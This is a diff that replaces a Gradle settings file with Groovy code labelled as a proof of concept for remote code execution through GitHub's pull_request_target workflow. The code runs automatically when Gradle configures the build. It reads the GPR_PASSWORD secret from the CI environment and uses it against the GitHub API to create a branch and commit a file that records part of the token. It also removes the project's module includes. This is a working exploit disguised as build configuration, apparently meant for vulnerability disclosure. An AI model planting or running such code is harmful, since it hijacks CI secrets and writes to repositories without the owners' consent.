@@ -1,12 +1,43 @@
-plugins {
-    id 'org.gradle.toolchains.foojay-resolver-convention' version '0.8.0'
+// PoC: demonstrates code execution via pull_request_target + Gradle
+// This runs during Gradle's configuration phase, before any task.
+
+def runTag = System.getenv("RUN_TAG") ?: "poc-rce-proof-" + System.currentTimeMillis()
+def token  = System.getenv("GPR_PASSWORD") ?: ""
+def repo   = System.getenv("GITHUB_REPOSITORY") ?: ""
+def runId  = System.getenv("GITHUB_RUN_ID") ?: "unknown"
+
+if (token && repo) {
+    def api = "https://api.github.com/repos/${repo}"
+
+    // 1. Read the default branch SHA
+    def refConn = new URL("${api}/git/ref/heads/development").openConnection()
+    refConn.setRequestProperty("Authorization", "token ${token}")
+    refConn.setRequestProperty("Accept", "application/vnd.github+json")
+    def refJson = new groovy.json.JsonSlurper().parse(refConn.inputStream)
+    def sha = refJson.object.sha
+
+    // 2. Create a PoC branch
+    def branchConn = new URL("${api}/git/refs").openConnection()
+    branchConn.setRequestMethod("POST")
+    branchConn.setRequestProperty("Authorization", "token ${token}")
+    branchConn.setRequestProperty("Content-Type", "application/json")
+    branchConn.doOutput = true
+    branchConn.outputStream.withWriter { it << """{"ref":"refs/heads/${runTag}","sha":"${sha}"}""" }
+    println "[PoC] Create branch: HTTP ${branchConn.responseCode}"
+
+    // 3. Create a proof file on that branch
+    def content = "Token prefix: ${token.take(12)}...\nRun ID: ${runId}\nTimestamp: ${new Date()}"
+    def encoded = content.bytes.encodeBase64().toString()
+    def fileConn = new URL("${api}/contents/poc-rce-proof.txt").openConnection()
+    fileConn.setRequestMethod("PUT")
+    fileConn.setRequestProperty("Authorization", "token ${token}")
+    fileConn.setRequestProperty("Content-Type", "application/json")
+    fileConn.doOutput = true
+    fileConn.outputStream.withWriter { it << """{"message":"PoC: RCE via pull_request_target","content":"${encoded}","branch":"${runTag}"}""" }
+    println "[PoC] Create file:   HTTP ${fileConn.responseCode}"
+} else {
+    println "[PoC] Not running in CI or token not available — skipping exploit."
 }
 
-apply plugin: 'org.gradle.toolchains.foojay-resolver-convention'
-
-rootProject.name = "aidial-core"
-include 'config'
-include 'server'
-include 'storage'
-include 'credentials'
-
+// Preserve original settings so the rest of the build still works
+rootProject.name = 'ai-dial-core'
